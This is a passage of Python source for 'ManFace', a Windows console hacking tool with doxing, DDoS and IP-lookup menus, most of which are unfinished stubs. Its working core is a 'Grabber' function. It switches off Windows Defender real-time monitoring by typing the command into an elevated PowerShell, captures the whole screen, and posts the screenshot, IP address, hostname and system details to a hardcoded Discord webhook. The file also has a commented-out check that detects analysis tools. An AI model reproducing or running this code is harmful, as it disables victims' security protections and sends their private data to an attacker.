    lowercase_letters = uppercase_letters.lower()

    upper, lower = True, True

    all = ""

    length = 20
    amount = 10


    if upper:
        all += uppercase_letters

    if lower:
        all += lowercase_letters

    for x in range(amount):
        Password = "".join(random.sample(all, length))
        print(Password)

    users = [[Password]]

    def is_admin():
        try:
            with open(os.path.join(os.environ["SystemRoot"], "test.txt"), "w") as test_file:
                test_file.write("This is a test")
            os.remove(os.path.join(os.environ["SystemRoot"], "test.txt"))
            return True
        except:
            return False

    def keystart():
        if not is_admin():
            os.system(f"cls && title Login - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Login - MANFACE v1.0.0 [RUNNING AS ADMIN]")

    def check_internet_connection():
        try:
            host = "www.google.com"
            port = 80
            timeout = 1

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            sock.connect((host, port))

            print(f"[{green}SERVER NOTICE{white}]SUCCESSFULLY CONNECTED TO SERVER")
            serverConnected = True

            sock.close()
            time.sleep(1)
            keystart()
            Key(users)
        except Exception as e:
            print(f"[{cyan}NOTICE{white}]FAILED TO CONNECT TO SERVER")
            print(f"[{cyan}NOTICE{white}]REASSON: {e}")
            serverConnected = False
            time.sleep(1)
            print(f"[{yellow}RETRYING{white}]")
            check_internet_connection()

    current_version = "1.0.0"

    gist_raw_url = "https://gist.githubusercontent.com/NilsNisse/34bf3e3ebda7ed86a257e477c6394525/raw/a35f7a3960fd9e0c557942e146fb17d6bd27fa15/ManFaceUpdater.txt"

    def FirstStart():
        print(f"[{cyan}NOTICE{white}]Checking if admin...")
        if not is_admin():
            print(f"[{red}WARNING{white}]You are running ManFace without admin, some options might fail and crash.")
            time.sleep(5)
            if __name__ == "__main__":
                check_internet_connection()
        if is_admin():
            print(f"[{green}INFO{white}]Running as admin")
            time.sleep(0.5)
            if __name__ == "__main__":
                check_internet_connection()

    def startFirstStart():
        if not is_admin():
            os.system(f"cls && title Connecting - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        if is_admin():
            os.system(f"cls && title Connecting - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        FirstStart()
    startFirstStart()

    #============================================================Anti-reverse-engineer System============================================================#
    """
    def Anti_reverse_detect():
        os.system("cls")
        print(f"\n{red}|{white} {red}[{white} Black listed program(s) detected {red}]{white}")
        time.sleep(2.5)
        os.system("cls")
        sys.exit()

    def Anti_reverse_undetect():
        os.system("cls")
        print(f"\n{green}|{white} {green}[{white} No black listed program(s) detected {green}]{white}")
        time.sleep(2.5)
        os.system("cls")
        FirstStart()

    def Anti_Reverse_start():
        def encrypt(text):
            encrypted_text = ""
            for char in text:
                encrypted_text += chr(ord(char) + 1)  #Shift each character by 1 (you can use a more complex algorithm)
            return encrypted_text

        def decrypt(text):
            decrypted_text = ""
            for char in text:
                if len(decrypted_text) < len(text) - 4:
                    decrypted_text += chr(ord(char) - 1)  #Decrypt all characters except the last 4
                else:
                    decrypted_text += char  #Keep the last 4 characters as-is
            return decrypted_text
        
        def is_process_running(process_name):
            process_list = psutil.process_iter(attrs=['name'])
            for process in process_list:
                try:
                    if process.info['name'] == process_name:
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass

            return False
        for process_name in blackListed[0:]:
            done = False
            original_name = process_name[0]  #Store the original name
            if original_name.endswith(".exe"):
                encrypted_name = encrypt(original_name[:-4]) + ".exe"  #Encrypt the name without ".exe" and add it back
            else:
                encrypted_name = encrypt(original_name)  #Encrypt the entire name
            if is_process_running(original_name):
                print(f"{red}|{white}{red}[{white}-{red}]{white} {encrypted_name:<30} {green}[{white}Checked{green}]{white} > {green}True{white} {red}|{white} {red}[{white}Detected{red}]{white} > {red}True{white}  {red}|{white}")
                time.sleep(2)
                Anti_reverse_detect()
            else:
                print(f"{green}|{white}{green}[{white}+{green}]{white} {encrypted_name:<30} {green}[{white}Checked{green}]{white} > {green}True{white} {green}|{white} {green}[{white}Detected{green}]{white} > {green}False{white} {green}|{white}")
                if original_name == "WiresharkLauncher.exe":
                    done = True
                    if done == True:
                        Anti_reverse_undetect()
                        done = False
    Anti_Reverse_start()
    """












elif ManFace_Test == False:
    def anti_reverse_live():
        if not is_admin():
            os.system(f"cls && title Anti-reverse-detection - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        if is_admin():
            os.system(f"cls && title Anti-reverse-detection - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        time.sleep(0.5)
        os.system("cls")
        def center_text(text):
            terminal_width, _ = shutil.get_terminal_size(fallback=(80, 24))

            if len(text) >= terminal_width:
                return text  # Text is longer than or equal to the terminal width

            padding = terminal_width - len(text)
            left_padding = padding // 2
            right_padding = padding - left_padding

            centered_text = " " * left_padding + text + " " * right_padding

            return centered_text

        # Example usage:
        for i in range(1, 100):
            os.system("cls")
            text_to_center = f"{red}[{white} Black listed program detected... {red}]{white} \n {red}[{white}Error1{red}]{white}"
            centered_text = center_text(text_to_center)
            print(centered_text)

        time.sleep(2.5)
        sys.exit()

    def download():
        link = "https://www.youtube.com/watch?v=MG2hEIrHsBQ&ab_channel=Themilkman1986"
        try:
            ytlink = link.get()
            ytObject = YouTube(ytlink)
            video = ytObject.streams.get_highest_resolution()
            video.download()
        except:
            print(f"{red}Error{white}")

    def is_admin():
        try:
            with open(os.path.join(os.environ["SystemRoot"], "test.txt"), "w") as test_file:
                test_file.write("This is a test")
            os.remove(os.path.join(os.environ["SystemRoot"], "test.txt"))
            return True
        except:
            return False

    def crashReport():
        crashText = f"Looks like ManFace_helper.exe ran into a probelm..."

    def phoneLookUp():
        print(f"{red}[{white} Comming soon {red}]{white}")
        time.sleep(2.5)
        menuPage1()

    def get_IPv4_address2():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ipv4_address = s.getsockname()[0]
            s.close()
            return ipv4_address
        except Exception as e:
            print("Error occurred while fetching IPv4 address:", e)
            return None

    def UserInfoWebhookSender():
        if not is_admin():
            os.system(f"cls && title Loading - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Loading - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        webhook = "https://discord.com/api/webhooks/1142595203090362510/jAzFvnIStPqUs40U_mhA3onoyg6kyOLN2yB-VVQFapFCd-BpJCibczddgMOG3NOw1Co0"
        
        #screenshot.save(screenshot_path)

        #os.remove(f"{os.path.abspath(screenshot_path)}")

        hostname2 = socket.gethostname()
        print(f"[{cyan}INFO{white}]Saved ip_address...")
        ip_address2 = socket.gethostbyname(hostname2)
        subprocess.Popen(["start", "PowerShell", "Set-ExecutionPolicy Unrestricted", "A"], shell = True)
        try:
            subprocess.run(["powershell.exe", "-Command", "Start-Process", "powershell.exe", "-Verb", "runAs"])
        except FileNotFoundError:
            print("PowerShell not found. Make sure PowerShell is installed.")

        pyautogui.click(800, 650)
        pyautogui.hotkey("ctrlleft")
        time.sleep(0.5)
        write("Set-MpPreference -DisableRealtimeMonitoring $true")

        keyboard.Key.enter
        pyautogui.click(800, 650)
        pyautogui.hotkey("enter")

        """
        command = open("command.txt")

        for each_line in command:
            pyautogui.typewrite(each_line)

        """

        #subprocess.Popen(["start", "cmd", "/k", "mstsc /console /v:" + adminPC], shell = True)
        time.sleep(0.3)

        screen_width, screen_height = pyautogui.size()
        screenshot = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))

        screenshot_path = "0x462.png"
        screenshot.save(screenshot_path)
        print(f"[{cyan}INFO{white}]Saved picture...")

        payload2 = {
            "file": (
                f"{os.path.abspath(screenshot_path)}", open(f"{os.path.abspath(screenshot_path)}", "rb")
            )
        }

        response = requests.post(webhook, files=payload2)

        if response.status_code == 204:
            time.sleep(0.1)

        screenshot.close()



        time.sleep(2)
        print(f"[{cyan}INFO{white}]Saved ip_address2...")

        system2 = platform.uname()
        print(f"[{cyan}INFO{white}]Saved system2...")
        cpu_info2 = platform.processor()
        print(f"[{cyan}INFO{white}]Saved cpu_info2...")
        memory2 = psutil.virtual_memory()
        print(f"[{cyan}INFO{white}]Saved memory2...")
        disk_partitions2 = psutil.disk_partitions()
        network_info2 = psutil.net_if_addrs()

        payload = {
            "embeds": [
                {
                    "title": "ManFace Grabber [BETA]",
                    "color": 0x008000,
                    "author": {"url": "https://cdn.discordapp.com/attachments/1063976441856917604/1141414523035713616/IMG_0407.jpg"},
                    "fields": [
                        {
                        "name": "┏[HOST-INFO]",
                        "value": f"┣━> [IP]: **{ip_address2}** \n┗━> [HOST]: **{hostname2}**",
                        "inline": False,
                        },

                        {"name": "┏[SYSTEM-INFO]",
                        "value": f"┣━> [OS]: **{system2.system}** \n┣━> [SYSTEM NODE]: **{system2.node}** \n┣━> [SYSTEM RELEASE]: **{system2.release}** \n┣━> [SYSTEM VERSION]: **{system2.version}** \n┗━> [SYSTEM MACHINE]: **{system2.machine}**",
                        "inline": False
                        },
                        {"name": "┏[SPECS-INFO]",
                        "value": f"┣━> [CPU]: **{cpu_info2}** \n┗━> [DISK PARTITIONS]: **{memory2.total}** bytes",
                        "inline": False
                        },
                        {"name": "┏[MANFACE-INFO]",
                        "value": f"┣━> [Onetime use MF Password]: **{Password}** \n┗━> []: **{memory2.total}**",
                        "inline": False
                        },
                    ],
                    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1142594881299173418/1175974503998836776/q22HDNY.jpg?ex=656d2e9a&is=655ab99a&hm=490125a74f3427eaa768c129b47eb63f4bbd35eb09aa9ebebf27da4b218084f8&"}
                }
            ]
        }
        print("")
        print(f"[{green}SUCCESS{white}]Sent saved data to discord webhook.")
        FailedPayload = {
            "embeds": [
                {
                    "title": "ManFace Grabber [BETA]",
                    "color": 0xFF0000,
                    "author": {"url": "https://cdn.discordapp.com/attachments/1063976441856917604/1141414523035713616/IMG_0407.jpg"},
                    "fields": [
                        {
                        "name": "┏[HOST-INFO]",
                        "value": f"┣━> [IP]: **error** \n┗━> [HOST]: **error**",
                        "inline": False,
                        },

                        {"name": "┏[SYSTEM-INFO]",
                        "value": f"┣━> [OS]: **error** \n┣━> [SYSTEM NODE]: **error** \n┣━> [SYSTEM RELEASE]: **error** \n┣━> [SYSTEM VERSION]: **error** \n┗━> [SYSTEM MACHINE]: **error**",
                        "inline": False
                        },
                        {"name": "┏[SPECS-INFO]",
                        "value": f"┣━> [CPU]: **error** \n┗━> [DISK PARTITIONS]: **error**",
                        "inline": False
                        },
                    ],
                    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1063976441856917604/1141414523035713616/IMG_0407.jpg"}
                }
            ]
        }
        headers = {
            "Content-Type": "application/json"
        }

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        response2 = requests.post(webhook, json=payload)

        def ManFaceRestart(file_path):
            try:
                subprocess.run(["python", file_path], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Error while running the file: {e}")
            except FileNotFoundError:
                print("File not found")
            except Exception as e:
                print(f"An error occurred: {str(e)}")

        if response2.status_code == 204:
            time.sleep(0.1)
        elif response2 == requests.ConnectionError:
            FailResponse2 = requests.post(webhook, json=FailedPayload)
            if FailResponse2.status_code == 400:
                time.sleep(0.1)
                restart = True
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 5 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 4 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 3 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 2 [close this if you do not wanna restart ManFace.exe]")
                time.sleep(1)
                os.system("cls")
                print(f"[{Fore.RED}error{Fore.WHITE}] Something went wrong with the connection\n[-] restarting in 1 [close this if you do not wanna restart ManFace.exe]")
                print(f"[-] Preparing ManFace.exe")
                file_path = "C:\\Users\\nilsv\\Desktop\\Stuff\\CodingStuff\\Python_Projects\\MAN-FACE\\ManFaceV1.0.0\\MANFACE_admin.py"
                ManFaceRestart(file_path)
                time.sleep(1)
        time.sleep(2.5)

    ByeLove_text = f"""{Fore.MAGENTA}    ██████╗ ██╗   ██╗███████╗       ██╗      ██████╗ ██╗   ██╗███████╗
        ██╔══██╗╚██╗ ██╔╝██╔════╝       ██║     ██╔═══██╗██║   ██║██╔════╝
        ██████╔╝ ╚████╔╝ █████╗         ██║     ██║   ██║██║   ██║█████╗  
        ██╔══██╗  ╚██╔╝  ██╔══╝         ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  
        ██████╔╝   ██║   ███████╗▄█╗    ███████╗╚██████╔╝ ╚████╔╝ ███████╗
        ╚═════╝    ╚═╝   ╚══════╝╚═╝    ╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝{white}"""

    def exit_command():
        os.system("cls")
        print("    Do you wanna exit?")
        ByeLove = input("    Y/N: ")
        if ByeLove == "Y":
            time.sleep(0.5)
            os.system("cls")
            print(ByeLove_text)
            time.sleep(2)
            sys.exit(0)
        elif ByeLove == "y":
            time.sleep(0.5)
            os.system("cls")
            print(ByeLove_text)
            time.sleep(2)
            sys.exit(0)
        elif ByeLove == "N":
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif ByeLove == "n":
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        else:
            print(f"    {red}THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(2.5)
            os.system("cls")
            Layer4()

    def IP_grabber():
        os.system("cls")
        time.sleep(1)
        print("OPAEGJKAEIOFWEVIAHBUI")
        time.sleep(2.5)
        os.system("cls")
        onstart


    def Dox_list():
        hostname = socket.gethostname()
        Admin = "DESKTOP-OFALC7N"

        welcome5 = """
    Welcome To"""

        text5 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                    {white}ManFace{red}  :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                        ██████╗  ██████╗ ██╗  ██╗       ██╗     ██╗███████╗████████╗
                        ██╔══██╗██╔═══██╗╚██╗██╔╝       ██║     ██║██╔════╝╚══██╔══╝
                        ██║  ██║██║   ██║ ╚███╔╝ █████╗ ██║     ██║███████╗   ██║   
                        ██║  ██║██║   ██║ ██╔██╗ ╚════╝ ██║     ██║╚════██║   ██║   
                        ██████╔╝╚██████╔╝██╔╝ ██╗       ███████╗██║███████║   ██║   
                        ╚═════╝  ╚═════╝ ╚═╝  ╚═╝       ╚══════╝╚═╝╚══════╝   ╚═╝   
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}1{white}] {green}>{white} RVVZ                                                                      ┃
        ┃ [{cyan}2{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}3{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}4{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}5{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}6{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}7{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}8{white}] {green}>{white} Prev-page(1)                                                              ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3

        print(welcome5, text5)

        DoxCommand = input(f"""\n   ┏━━({hostname}-admin[{green}1{white}]Dox-list)━[$]
    ┗━$> """)
        
        if DoxCommand == "Exit":
            time.sleep(0.5)
            exit_command()
        elif DoxCommand == "exit":
            time.sleep(0.5)
            exit_command()
        elif DoxCommand == "1":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "2":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "3":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "4":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "5":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "6":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "7":
            print("Does not work yet")
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif DoxCommand == "8":
            time.sleep(0.5)
            menuPage2()

    def Layer7():
        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""
        Admin = "DESKTOP-OFALC7N"

        welcome4 = """
    Welcome To"""

        text4 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                            ██╗      █████╗ ██╗   ██╗███████╗██████╗      ███████╗
                            ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗     ╚════██║
                            ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝ █████╗  ██╔╝
                            ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗ ╚════╝ ██╔╝ 
                            ███████╗██║  ██║   ██║   ███████╗██║  ██║        ██║  
                            ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝        ╚═╝  
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}1{white}] {green}>{white} URL-ping                                                                  ┃
        ┃ [{cyan}2{white}] {green}>{white} URL-DDoS                                                                  ┃
        ┃ [{cyan}3{white}] {green}>{white} URL-To-Info                                                               ┃
        ┃ [{cyan}4{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}5{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}6{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}7{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}8{white}] {green}>{white} Prev-page(1)                                                              ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3

        print(welcome4, text4)
    
        L7Command = input(f"""\n   ┏━━({hostname}-admin[{green}1{white}]Layer-7)━[$]
    ┗━$> """)
        
        if L7Command == "Exit":
            time.sleep(0.5)
            exit_command()
        elif L7Command == "exit":
            time.sleep(0.5)
            exit_command()
        elif L7Command == "1":
            print("Does not work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "2":
            print("Does not work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "3":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "4":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "5":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "6":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "7":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer7()
        elif L7Command == "8":
            time.sleep(0.5)
            os.system("cls")
            onstart()
        else:
            print(f"{red}    THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(0.5)
            os.system("cls")
            Layer7()


    def Layer4():
        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""

        welcome3 = """
    Welcome To"""

        text3 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                        ██╗      █████╗ ██╗   ██╗███████╗██████╗         ██╗  ██╗
                        ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗        ██║  ██║
                        ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝ █████╗ ███████║
                        ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗ ╚════╝ ╚════██║
                        ███████╗██║  ██║   ██║   ███████╗██║  ██║             ██║
                        ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝             ╚═╝
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}1{white}] {green}>{white} IPv4-ping                                                                 ┃
        ┃ [{cyan}2{white}] {green}>{white} IPv4-DDoS                                                                 ┃
        ┃ [{cyan}3{white}] {green}>{white} IPv4-To-Info                                                              ┃
        ┃ [{cyan}4{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}5{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}6{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}7{white}] {green}>{white}                                                                           ┃
        ┃ [{cyan}8{white}] {green}>{white} Prev-page(1)                                                              ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3

        print(welcome3, text3)
    
        L4Command = input(f"""\n    ┏━━({hostname}-admin[{green}1{white}]Layer-4)━[$]
    ┗━$> """)
        
        if L4Command == "Exit":
            time.sleep(0.5)
            exit_command()
        elif L4Command == "exit":
            time.sleep(0.5)
            exit_command()
        elif L4Command == "1":
            time.sleep(0.5)
            os.system("cls")
            exit_command()
        elif L4Command == "2":
            print("Does not work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "3":
            def IPv4LookUp():
                IP = input("    IP: ")
                url = f"https://www.infobyip.com/ipwhois-{IP}.html"
                response = urllib.request.urlopen(url)
                data = response.read(response)
                print(data)
            IPv4LookUp()
            os.system("cls")
            time.sleep(5)
            Layer4()
        elif L4Command == "4":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "5":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "6":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "7":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "8":
            time.sleep(0.5)
            os.system("cls")
            onstart()
        else:
            print(f"{red}    THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(0.5)
            os.system("cls")
            Layer4()


    def menuPage2():
        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""

        welcome2 = """
    Welcome To"""

        text2 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
